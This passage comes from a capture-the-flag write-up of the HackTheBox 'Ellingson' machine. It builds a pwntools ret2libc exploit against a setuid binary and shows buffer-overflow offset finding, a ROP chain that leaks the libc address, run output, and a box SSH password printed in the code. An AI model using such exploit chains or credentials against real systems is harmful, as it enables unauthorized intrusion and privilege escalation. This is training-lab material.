class="line">&#x2F;usr&#x2F;bin&#x2F;traceroute6.iputils           </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chfn     </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgidmap           </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chsh</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkit-agent-helper-1</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;snapd&#x2F;snap-confine</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;lxc&#x2F;lxc-user-nic</span><br><span class="line">&#x2F;bin&#x2F;su</span><br><span class="line">&#x2F;bin&#x2F;umount</span><br><span class="line">&#x2F;bin&#x2F;ntfs-3g</span><br><span class="line">&#x2F;bin&#x2F;ping</span><br><span class="line">&#x2F;bin&#x2F;mount</span><br><span class="line">&#x2F;bin&#x2F;fusermount</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<p>When executed it asks for a password, providing a long password crashes it:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">margo@ellingson:~$ &#x2F;usr&#x2F;bin&#x2F;garbage</span><br><span class="line">Enter access password: test</span><br><span class="line"></span><br><span class="line">access denied.</span><br><span class="line">margo@ellingson:~$ &#x2F;usr&#x2F;bin&#x2F;garbage </span><br><span class="line">Enter access password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line"></span><br><span class="line">access denied.</span><br><span class="line">Segmentation fault (core dumped)</span><br><span class="line">margo@ellingson:~$</span><br></pre></td></tr></table></figure>
<p>So we have a buffer overflow, I downloaded the binary on my machine:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ellingson# scp margo@ellingson.htb:&#x2F;usr&#x2F;bin&#x2F;garbage .&#x2F;                                                                                                                              </span><br><span class="line">margo@ellingson.htb&#39;s password:</span><br><span class="line">garbage                                                                                                                                                                          100%   18KB  60.4KB&#x2F;s   00:00    </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ellingson#</span><br></pre></td></tr></table></figure>
<p><code>checksec</code> shows that <code>NX</code> (non-executable stack) is enabled so we will do a <code>ret2libc</code> attack:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/ellingson<span class="meta"># file garbage</span></span><br><span class="line">garbage: setuid ELF <span class="number">64</span>-<span class="built_in">bit</span> LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=de1fde9d14eea8a6dfd050fffe52bba92a339959, <span class="keyword">not</span></span><br><span class="line">stripped</span><br><span class="line">root@kali:~/Desktop/HTB/boxes/ellingson# checksec ./garbage</span><br><span class="line">[*] '/root/Desktop/HTB/boxes/ellingson/garbage'</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE</span><br></pre></td></tr></table></figure>
<p><code>ASLR</code> is enabled so will need to get around that:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">margo@ellingson:~$ cat &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</span><br><span class="line">2</span><br></pre></td></tr></table></figure>
<p>I downloaded <code>libc</code> from the box:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">margo@ellingson:~$ ldd &#x2F;usr&#x2F;bin&#x2F;garbage</span><br><span class="line">        linux-vdso.so.1 (0x00007ffd0a7f0000)</span><br><span class="line">        libc.so.6 &#x3D;&gt; &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 (0x00007f55ded1e000)</span><br><span class="line">        &#x2F;lib64&#x2F;ld-linux-x86-64.so.2 (0x00007f55df10f000)</span><br><span class="line">margo@ellingson:~$</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ellingson# scp margo@ellingson.htb:&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 .&#x2F;</span><br><span class="line">margo@ellingson.htb&#39;s password:</span><br><span class="line">libc.so.6                                                                                                                                                                        100% 1983KB 263.6KB&#x2F;s   00:07    </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ellingson#</span><br></pre></td></tr></table></figure>


<h2 id="Binary-Exploitation"><a href="#Binary-Exploitation" class="headerlink" title="Binary: Exploitation"></a>Binary: Exploitation</h2><p>To defeat <code>ASLR</code> our first <code>rop</code> chain will leak <code>__libc_start_main</code> by calling <code>puts()</code> with <code>__libc_start_main@plt</code> address as an argument. Then by subtracting <code>__libc_start_main@@GLIBC</code> address from the leaked address we will get the base address of <code>libc</code>.<br>After leaking <code>libc</code>‘s address we can easily calculate the addresses we need and do our second chain which will perform the <code>ret2libc</code> attack.<br>First we need to find the offset, I used a pattern to do it (I’m using <a href="https://github.com/hugsy/gef" target="_blank" rel="noopener">gef</a>):</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">gef➤  pattern create</span><br><span class="line">[+] Generating a pattern of <span class="number">1024</span> bytes</span><br><span class="line"></span><br><span class="line">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaa</span><br><span class="line">aaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaa</span><br><span class="line">acdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaade</span><br><span class="line">aaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaa</span><br><span class="line">aaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaaf                               </span><br><span class="line">[+] Saved as '$_gef0'</span><br><span class="line">gef➤  r</span><br><span class="line">Starting program: /root/Desktop/HTB/boxes/ellingson/garbage</span><br><span class="line"></span><br><span class="line">Enter access password: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaaf       </span><br><span class="line"></span><br><span class="line">access denied.</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line"><span class="number">0x0000000000401618</span> <span class="function">in <span class="title">auth</span> <span class="params">()</span></span></span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────</span><br><span class="line">$rax   : <span class="number">0x0</span></span><br><span class="line">$rbx   : <span class="number">0x0</span></span><br><span class="line">$rcx   : <span class="number">0x00007f472f47a504</span>  →  <span class="number">0x5477fffff0003d48</span> (<span class="string">"H="</span>?)</span><br><span class="line">$rdx   : <span class="number">0x00007f472f54d8c0</span>  →  <span class="number">0x0000000000000000</span></span><br><span class="line">$rsp   : <span class="number">0x00007ffcc590c3e8</span>  →  <span class="string">"raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxa[...]"</span></span><br><span class="line">$rbp   : <span class="number">0x6161616161616171</span> (<span class="string">"qaaaaaaa"</span>?)</span><br><span class="line">$rsi   : <span class="number">0x000000000077c9c0</span>  →  <span class="string">"access denied.\nssword:"</span></span><br><span class="line">$rdi   : <span class="number">0x0</span></span><br><span class="line">$rip   : <span class="number">0x0000000000401618</span>  →  &lt;auth+<span class="number">261</span>&gt; ret </span><br><span class="line">$r8    : <span class="number">0x00007f472f552500</span>  →  <span class="number">0x00007f472f552500</span>  →  [loop detected]</span><br><span class="line">$r9    : <span class="number">0x00007f472f54c848</span>  →  <span class="number">0x00007f472f54c760</span>  →  <span class="number">0x00000000fbad2a84</span></span><br><span class="line">$r10   : <span class="number">0xfffffffffffff638</span></span><br><span class="line">$r11   : <span class="number">0x246</span></span><br><span class="line">$r12   : <span class="number">0x0000000000401170</span>  →  &lt;_start+<span class="number">0</span>&gt; <span class="keyword">xor</span> ebp, ebp</span><br><span class="line">$r13   : <span class="number">0x00007ffcc590c4e0</span>  →  <span class="string">"xaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaacea[...]"</span></span><br><span class="line">$r14   : <span class="number">0x0</span></span><br><span class="line">$r15   : <span class="number">0x0</span></span><br><span class="line">$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction <span class="built_in">overflow</span> RESUME virtualx86 identification]                                                                                                       </span><br><span class="line">$cs: <span class="number">0x0033</span> $ss: <span class="number">0x002b</span> $ds: <span class="number">0x0000</span> $es: <span class="number">0x0000</span> $fs: <span class="number">0x0000</span> $gs: <span class="number">0x0000</span></span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── <span class="built_in">stack</span> ────</span><br><span class="line"><span class="number">0x00007ffcc590c3e8</span>│+<span class="number">0x0000</span>: <span class="string">"raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxa[...]"</span>    ← $rsp</span><br><span class="line"><span class="number">0x00007ffcc590c3f0</span>│+<span class="number">0x0008</span>: <span class="string">"saaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaaya[...]"</span></span><br><span class="line"><span class="number">0x00007ffcc590c3f8</span>│+<span class="number">0x0010</span>: <span class="string">"taaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaaza[...]"</span></span><br><span class="line"><span class="number">0x00007ffcc590c400</span>│+<span class="number">0x0018</span>: <span class="string">"uaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabba[...]"</span></span><br><span class="line"><span class="number">0x00007ffcc590c408</span>│+<span class="number">0x0020</span>: <span class="string">"vaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabca[...]"</span></span><br><span class="line"><span class="number">0x00007ffcc590c410</span>│+<span class="number">0x0028</span>: <span class="string">"waaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabda[...]"</span></span><br><span class="line"><span class="number">0x00007ffcc590c418</span>│+<span class="number">0x0030</span>: <span class="string">"xaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabea[...]"</span></span><br><span class="line"><span class="number">0x00007ffcc590c420</span>│+<span class="number">0x0038</span>: <span class="string">"yaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfa[...]"</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:<span class="number">64</span> ────</span><br><span class="line">     <span class="number">0x40160d</span> &lt;auth+<span class="number">250</span>&gt;       call   <span class="number">0x401050</span> &lt;<span class="built_in">puts</span>@plt&gt;</span><br><span class="line">     <span class="number">0x401612</span> &lt;auth+<span class="number">255</span>&gt;       mov    eax, <span class="number">0x0</span></span><br><span class="line">     <span class="number">0x401617</span> &lt;auth+<span class="number">260</span>&gt;       leave  </span><br><span class="line"> →   <span class="number">0x401618</span> &lt;auth+<span class="number">261</span>&gt;       ret    </span><br><span class="line">[!] Cannot disassemble from $PC</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#<span class="number">0</span>] Id <span class="number">1</span>, Name: <span class="string">"garbage"</span>, stopped, reason: SIGSEGV</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#<span class="number">0</span>] <span class="number">0x401618</span> → auth()</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  pattern offset raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxa</span><br><span class="line">[+] Searching 'raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxa'</span><br><span class="line">[+] Found at offset <span class="number">136</span> (big-endian search)</span><br><span class="line">gef➤</span><br></pre></td></tr></table></figure>
<p>Offset is 136 bytes, let’s start writing the exploit (I’m using <a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener">pwntools</a>).<br>First thing to do is to set-up the connection to the box and start the remote process, we have <code>ssh</code> access so we can use that:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r = ssh(host=<span class="string">'ellingson.htb'</span>, user=<span class="string">'margo'</span>, password=<span class="string">'iamgod$08'</span>)</span><br><span class="line">p = r.process(<span class="string">'/usr/bin/garbage'</span>)</span><br></pre></td></tr></table></figure>
<p>Then we need to load the binary file and <code>libc</code> in the exploit:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">"./garbage"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br></pre></td></tr></table></figure>
<p>We can use the <code>ROP()</code> function to load the <code>rop</code> gadgets from the binary:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rop = ROP(elf)</span><br></pre></td></tr></table></figure>
<p><code>exploit.py</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = ssh(host=<span class="string">'ellingson.htb'</span>, user=<span class="string">'margo'</span>, password=<span class="string">'iamgod$08'</span>)</span><br><span class="line">p = r.process(<span class="string">'/usr/bin/garbage'</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./garbage"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">rop = ROP(elf)</span><br></pre></td></tr></table></figure>

<h3 id="Exploitation-Leaking-libc-base-address"><a href="#Exploitation-Leaking-libc-base-address" class="headerlink" title="Exploitation: Leaking libc base address"></a>Exploitation: Leaking libc base address</h3><p>I created a function called <code>leak()</code> that takes 4 arguments (the process, the loaded binary file, <code>libc</code> and the <code>rop</code> gadgets):</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(p,elf,libc,rop)</span>:</span></span><br></pre></td></tr></table></figure>
<p>This function will perform the 1st <code>rop</code> chain, it will send 136 bytes to reach <code>rip</code> and overwrite it with a <code>pop rdi, ret</code> gadget, then it will send <code>__libc_start_main@plt</code>‘s address (will be placed in <code>rdi</code>) and call <code>puts()</code> which will take its argument from <code>rdi</code> and print the address of <code>__libc_start_main</code>. Finally it will call <code>main()</code> again to prevent execution from breaking (if the execution breaks the leaked address will be of no use because it won’t be the same when we execute the program again).<br>We need the addresses of <code>pop rdi, ret</code> gadget, <code>__libc_start_main@plt</code> from the binary, <code>puts()@plt</code> from the binary, <code>main()</code> from the binary, to get them:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POP_RDI = (rop.find_gadget([<span class="string">'pop rdi'</span>, <span class="string">'ret'</span>]))[<span class="number">0</span>]</span><br><span class="line">LIBC_START_MAIN = elf.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">PUTS = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">MAIN = elf.symbols[<span class="string">'main'</span>]</span><br></pre></td></tr></table></figure>
<p>Now we can simply construct the payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"A"</span> * <span class="number">136</span></span><br><span class="line">payload += p64(POP_RDI)</span><br><span class="line">payload += p64(LIBC_START_MAIN)</span><br><span class="line">payload += p64(PUTS)</span><br><span class="line">payload += p64(MAIN)</span><br></pre></td></tr></table></figure>
<p>Finally we will send the payload and receive the leaked address:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">'password:'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">leak = p.recvline().strip()</span><br><span class="line">leak = u64(leak.ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">"Leaked __libc_start_main: "</span> + hex(leak))</span><br><span class="line"><span class="keyword">return</span> leak</span><br></pre></td></tr></table></figure>
<p>Let’s test it:<br><code>exploit.py</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(p,elf,libc,rop)</span>:</span></span><br><span class="line">	POP_RDI = (rop.find_gadget([<span class="string">'pop rdi'</span>, <span class="string">'ret'</span>]))[<span class="number">0</span>]</span><br><span class="line">	LIBC_START_MAIN = elf.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">	PUTS = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">	MAIN = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">	</span><br><span class="line">	log.info(<span class="string">"puts@plt: "</span> + hex(PUTS))</span><br><span class="line">	log.info(<span class="string">"__libc_start_main: "</span> + hex(LIBC_START_MAIN))</span><br><span class="line">	log.info(<span class="string">"pop rdi gadget: "</span> + hex(POP_RDI))</span><br><span class="line">	</span><br><span class="line">	payload = <span class="string">"A"</span> * <span class="number">136</span></span><br><span class="line">	payload += p64(POP_RDI)</span><br><span class="line">	payload += p64(LIBC_START_MAIN)</span><br><span class="line">	payload += p64(PUTS)</span><br><span class="line">	payload += p64(MAIN)</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'password:'</span>)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	p.recvline()</span><br><span class="line">	p.recvline()</span><br><span class="line">	leak = p.recvline().strip()</span><br><span class="line">	leak = u64(leak.ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line"></span><br><span class="line">	log.success(<span class="string">"Leaked __libc_start_main: "</span> + hex(leak))</span><br><span class="line">	<span class="keyword">return</span> leak</span><br><span class="line"></span><br><span class="line">r = ssh(host=<span class="string">'ellingson.htb'</span>, user=<span class="string">'margo'</span>, password=<span class="string">'iamgod$08'</span>)</span><br><span class="line">p = r.process(<span class="string">'/usr/bin/garbage'</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./garbage"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">rop = ROP(elf)</span><br><span class="line"></span><br><span class="line">leak = leak(p,elf,libc,rop)</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/ellingson/exploit# ./exploit.py </span><br><span class="line">[+] Connecting to ellingson.htb on port <span class="number">22</span>: Done</span><br><span class="line">[*] margo@ellingson.htb:</span><br><span class="line">    Distro    Ubuntu <span class="number">18.04</span></span><br><span class="line">    OS:       linux</span><br><span class="line">    Arch:     amd64</span><br><span class="line">    Version:  <span class="number">4.15</span><span class="number">.0</span></span><br><span class="line">    ASLR:     Enabled</span><br><span class="line">[+] Starting remote process '/usr/bin/garbage' on ellingson.htb: pid 7730</span><br><span class="line">[*] '/root/Desktop/HTB/boxes/ellingson/exploit/garbage'</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br><span class="line">[*] '/root/Desktop/HTB/boxes/ellingson/exploit/libc.so.6'</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] Loaded cached gadgets for './garbage'</span><br><span class="line">[*] <span class="built_in">puts</span>@plt: <span class="number">0x401050</span></span><br><span class="line">[*] __libc_start_main: <span class="number">0x403ff0</span></span><br><span class="line">[*] pop rdi gadget: <span class="number">0x40179b</span></span><br><span class="line">[+] Leaked __libc_start_main: <span class="number">0x7f3dbe66fab0</span></span><br></pre></td></tr></table></figure>
<p>It’s working fine, to calculate the address of <code>libc</code> we will simply subtract <code>libc.sym[&quot;__libc_start_main&quot;]</code> from the leaked address:</p>
